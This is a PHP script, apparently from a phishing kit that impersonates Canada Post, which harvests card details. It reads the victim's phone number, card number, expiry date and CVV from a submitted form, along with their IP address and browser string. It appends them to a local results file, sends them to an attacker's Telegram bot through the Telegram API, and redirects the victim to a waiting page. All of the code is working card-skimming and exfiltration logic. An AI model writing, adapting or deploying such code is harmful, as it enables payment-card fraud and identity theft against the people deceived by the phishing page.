<?php
$zabi = getenv("REMOTE_ADDR");
$msg .= "--++-----[ CVV Poste Canada EN ]-----++--\n";
$msg .= "-------------- BY ht-----\n";
$msg .= "phone : ".$_POST['name']."\n";
$msg .= "card number : ".$_POST['card']."\n";
$msg .= "Exp date : ".$_POST['cardm']."/".$_POST['cardy']."\n";
$msg .= "Cvv : ".$_POST['cvv']."\n";
$msg .= "-------------- IP Infos ------------\n";
$msg .= "IP       : $zabi\n";
$msg .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$msg .= "----------------------By  ht ----------------------\n";

$text = fopen('../rzlt.txt', 'a');
fwrite($text, $msg);

include '../../config.php';
file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header("Location: ../wait.html");?>
